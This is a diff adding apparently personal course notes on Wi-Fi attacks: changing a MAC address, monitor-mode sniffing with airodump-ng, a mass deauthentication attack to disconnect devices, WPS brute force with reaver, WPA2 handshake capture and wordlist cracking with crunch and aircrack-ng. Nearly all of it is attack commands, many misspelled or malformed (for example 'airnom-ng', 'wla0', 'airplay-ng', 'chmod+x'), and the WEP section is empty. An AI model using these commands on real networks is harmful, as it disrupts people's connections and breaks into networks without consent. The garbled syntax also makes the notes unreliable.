@@ -1,0 +1,92 @@
+#mac adress and how to chnage it
+ifconfig
+ifconfig wlan0 down #disable the interferance
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+ifconfig
+
+# iwconfig #to see wireless interface only
+ifconfig wlan0 down
+airnom-ng check kill
+ifconfig wla0 mode monitor
+iwconfig 
+
+#packet sniffing basics
+iwconfig
+airodump-ng mon0[monitor mode interface]
+/
+[bssid] - show mac adress of target network
+[pwr] - signal 
+channel - [on which channel works on]
+enc - [encryption used ]
+auth - [authentication]
+eesid - [name]
+
+#
+iwconfig mon0
+airodump-ng --band a mon0[wireless adapter in monitor mode]
+/
+abg - to show all 2.4 and 5 ghz networks
+
+#targeted packet sniffing
+airodump-ng --bssid[BSSID] --channel 1 --write test mon0
+
+   # in the secomd section you will see information about device
+/
+station - mac adress of device
+
+ls test-01.cap [filename]
+wireshark
+
+#deauthentation attack(to dissconect any device)
+# to change the mac adress
+aireplay- ng --deauth 1000000 [number of packets] - a [mac adressof device (you will get under section 2 in bssid)] -c [station] -D[if it run on 5ghz] mon0
+
+
+#wep cracking
+
+
+
+
+
+
+
+
+
+
+
+#wpa and wpa2 cracking
+
+wash #display all the network around which has wps enabled
+aireplay-ng --fakeauth 30 -a [BSSID] -h [mac adress of the eirless adapter (6 digits)] mon0
+
+newterminal
+reaver --bssid[BSSID] --channel 1 -- interface mon0 -vvv[to show information] -- no associate
+< if not works update error 
+ls
+chmod+x reaver
+./reaver --bssid[BSSID] --channel 1 -- interface mon0 -vvv[to show information] -- no associate
+
+#wpa2 cracking 
+airdump-ng --bssid[BSSID] --channel 1 --write wpa_handhske mon0
+'''first we are disabling the clinet so when it gets connected it key will be shared
+
+airplay-ng --deauth 4 -a [mac adress of target(bssid)] -c [mac adress of clinet(station)] mon0
+
+
+#create a wordlist attack
+crunch [min][max][characters] -t[pattern] - o[filename]
+eg crunch 6 8 123abc$ -o wordlist -t a@@@@b
+
+man crunch
+crunch 6 8 abc$ -o test.txt
+
+cat test.txt # to open all keys
+
+#cracking wpa/wpa2 using wordlist
+ls
+aircrack-ng wpa_handshake-01.cap - test.txt(wordlist file )
+
+
+#
+ip route 
